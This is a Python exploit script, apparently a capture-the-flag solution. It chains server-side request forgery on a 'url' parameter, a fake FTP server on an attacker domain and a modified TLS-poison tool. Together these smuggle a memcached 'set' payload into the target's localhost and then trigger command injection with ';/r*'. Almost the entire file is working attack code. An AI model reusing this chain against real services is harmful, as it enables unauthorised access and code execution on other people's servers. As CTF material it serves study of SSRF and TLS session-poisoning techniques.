#!/usr/bin/env python3
import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os
import redis, secrets, re
 
# ip, port, my_ip, my_port = sys.argv[1:]
ip = "chall_ip"
port = 8010
my_port = 11211
my_ip = "tls_ip"
port, my_port, = int(port), int(my_port)
secret_path = secrets.token_hex(16)


url = f'http://{ip}:{port}/'
target = f'ftps://aws.smuggling.xyz:{my_port}/{secret_path}'
print('[+] target', target, file=sys.stderr)

# /var/ftp
os.system(f'sudo cp -r /home/ubuntu/ftps/uploads/ /var/ftp/{secret_path}')
os.system('sudo /etc/init.d/vsftpd start')

sess = requests.Session()
r = sess.get(url, params={'url': target})

os.system('sudo /etc/init.d/vsftpd stop')

sandbox = base64.b64decode(re.search('<h1>Sandbox</h1><code>(.+)</code', r.text).group(1))
print('[+] sandbox', sandbox, file=sys.stderr)

os.system('redis-server > /dev/null 2>&1 &')
time.sleep(2)
r = redis.Redis(host='127.0.0.1', port=6379, db=0)
cmd =  b';/r*'
payload = b"\r\nset "+ sandbox + cmd + b" 0 0 2\r\nOK\r\n"
print('payload len: ', len(payload), file=sys.stderr)
assert len(payload) <= 32
r.set('payload', payload)

# https://github.com/jmdx/TLS-poison modified for accepting 32 bytes injections
os.system(f'nohup /home/ubuntu/TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 --verbose >run.log 2>&1 &')

class MyTCPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        print('[+] connected', self.request, file=sys.stderr)
        self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr,flush=True)
        self.request.sendall(b'230 Login successful.\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 yolo\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 yolo\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'257 "/" is the current directory\r\n')

        if True:
            self.data = self.rfile.readline().strip().decode()
            print(self.data, file=sys.stderr)
            if f'CWD {secret_path}' != self.data:
                return
            self.request.sendall(b'250 Directory successfully changed.\r\n')

            self.data = self.rfile.readline().strip().decode()
            print(self.data, file=sys.stderr)
            self.request.sendall(b'250 Directory successfully changed.\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,203)\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,203)\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'200 Switching to Binary mode.\r\n')

        self.data = self.rfile.readline().strip().decode()
        assert 'SIZE refs' == self.data, self.data
        print(self.data, file=sys.stderr)
        self.request.sendall(b'213 7\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'150 Opening BINARY mode data connection for refs (7 bytes).\r\n')

        print(sess.get(url, params={'url': cmd}).text)
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'250 Requested file action okay, completed.')
        exit()

def ftp_worker():
    with socketserver.TCPServer(('0.0.0.0', 2048), MyTCPHandler) as server:
        while True:
            server.handle_request()
threading.Thread(target=ftp_worker).start()


time.sleep(2)
print(sess.get(url, params={'url': target}).text, file=sys.stderr)